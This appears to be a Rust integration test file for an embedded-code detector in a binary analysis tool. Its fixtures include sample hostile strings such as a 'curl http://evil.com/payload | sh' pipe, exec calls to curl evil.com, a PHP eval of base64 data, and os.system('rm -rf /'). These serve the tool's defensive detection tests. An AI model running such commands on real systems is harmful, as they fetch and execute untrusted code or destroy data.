//! Integration tests for embedded code detection in strings

use dissect::analyzers::embedded_code_detector::{detect_language, EmbeddedAnalysisResult, analyze_embedded_string};
use dissect::analyzers::FileType;
use dissect::capabilities::CapabilityMapper;
use dissect::types::binary::StringInfo;
use dissect::types::StringType;
use std::sync::Arc;

#[test]
fn test_detect_javascript_encoded() {
    let js_code = "const x = require('fs'); function evil() { eval('code'); }";
    let result = detect_language(js_code, true);
    assert_eq!(result, Some(FileType::JavaScript));
}

#[test]
fn test_detect_python_encoded() {
    let py_code = "import os\nimport sys\ndef malware():\n    os.system('curl evil.com')";
    let result = detect_language(py_code, true);
    assert_eq!(result, Some(FileType::Python));
}

#[test]
fn test_detect_shell_encoded() {
    let sh_code = "#!/bin/bash\ncurl http://evil.com/payload | sh";
    let result = detect_language(sh_code, true);
    assert_eq!(result, Some(FileType::Shell));
}

#[test]
fn test_detect_php_encoded() {
    let php_code = "<?php eval(base64_decode('malicious')); ?>";
    let result = detect_language(php_code, true);
    assert_eq!(result, Some(FileType::Php));
}

#[test]
fn test_javascript_with_eval_not_detected_as_python() {
    // JavaScript with eval() should be detected as JavaScript, not Python
    let js_code = "const fs = require('fs'); function bad() { eval('payload'); }";
    let result = detect_language(js_code, true);
    assert_eq!(result, Some(FileType::JavaScript), "JavaScript with eval() should be detected as JavaScript, not Python");
}

#[test]
fn test_plain_embedded_javascript() {
    let js_code = "function malware() { const x = 1; let y = 2; eval('code'); }";
    let result = detect_language(js_code, false);
    assert_eq!(result, Some(FileType::JavaScript));
}

#[test]
fn test_reject_plain_text() {
    let text = "This is just regular text without any code.";
    let result = detect_language(text, false);
    assert_eq!(result, None);
}

#[test]
fn test_reject_too_small() {
    let tiny = "import os";
    let result = detect_language(tiny, false);
    assert_eq!(result, None, "Too small to analyze reliably");
}

#[test]
fn test_encoded_lower_threshold() {
    // Encoded strings need only 1 match
    let code = "import os\ndef main():\n    pass";
    let result = detect_language(code, true);
    assert_eq!(result, Some(FileType::Python));
}

#[test]
fn test_analyze_hex_encoded_javascript() {
    let js_code = "const evil = require('child_process'); evil.exec('curl evil.com');";

    let string_info = StringInfo {
        value: js_code.to_string(),
        offset: Some(0),
        string_type: StringType::Literal,
        encoding: "utf-8".to_string(),
        section: Some("test".to_string()),
        encoding_chain: vec!["hex".to_string()],
        fragments: None,
    };

    let capability_mapper = Arc::new(CapabilityMapper::new());

    let result = analyze_embedded_string(
        "test.bin",
        &string_info,
        0,
        &capability_mapper,
        0,
    );

    assert!(result.is_ok(), "Should successfully analyze hex-encoded JavaScript");

    match result.unwrap() {
        EmbeddedAnalysisResult::EncodedLayer(file_analysis) => {
            // Should have findings from JavaScript analysis
            assert!(!file_analysis.findings.is_empty(), "Should detect capabilities in JavaScript");
            // Should have auto-generated language trait
            assert!(
                file_analysis.findings.iter().any(|f| f.id.contains("meta/lang/encoded/hex")),
                "Should have auto-generated meta/lang/encoded/hex trait"
            );
        }
        EmbeddedAnalysisResult::PlainEmbedded(_) => {
            panic!("Encoded code should create a layer, not plain findings");
        }
    }
}

#[test]
fn test_analyze_plain_embedded_python() {
    let py_code = "import os\nimport sys\ndef evil():\n    os.system('rm -rf /')\n    sys.exit(0)";

    let string_info = StringInfo {
        value: py_code.to_string(),
        offset: Some(0x5000),
        string_type: StringType::Literal,
        encoding: "utf-8".to_string(),
        section: Some("test".to_string()),
        encoding_chain: vec![],  // No encoding - plain embedded
        fragments: None,
    };

    let capability_mapper = Arc::new(CapabilityMapper::new());

    let result = analyze_embedded_string(
        "test.elf",
        &string_info,
        0,
        &capability_mapper,
        0,
    );

    assert!(result.is_ok(), "Should successfully analyze plain embedded Python");

    match result.unwrap() {
        EmbeddedAnalysisResult::PlainEmbedded(findings) => {
            // Should have findings from Python analysis
            assert!(!findings.is_empty(), "Should detect capabilities in Python");
            // Should have auto-generated language trait
            assert!(
                findings.iter().any(|f| f.id.contains("meta/lang/embedded")),
                "Should have auto-generated meta/lang/embedded trait"
            );
        }
        EmbeddedAnalysisResult::EncodedLayer(_) => {
            panic!("Plain embedded code should add findings to parent, not create a layer");
        }
    }
}

#[test]
fn test_max_depth_limit() {
    let js_code = "const x = require('fs'); x.readFile('test');";

    let string_info = StringInfo {
        value: js_code.to_string(),
        offset: Some(0),
        string_type: StringType::Literal,
        encoding: "utf-8".to_string(),
        section: Some("test".to_string()),
        encoding_chain: vec!["hex".to_string()],
        fragments: None,
    };

    let capability_mapper = Arc::new(CapabilityMapper::new());

    // Depth 3 should succeed
    let result = analyze_embedded_string("test.bin", &string_info, 0, &capability_mapper, 2);
    assert!(result.is_ok(), "Depth 2 should work (becomes 3 after increment)");

    // Depth 4 should fail
    let result = analyze_embedded_string("test.bin", &string_info, 0, &capability_mapper, 3);
    assert!(result.is_err(), "Depth 3 should fail (would become 4, exceeds MAX_DECODE_DEPTH)");
}
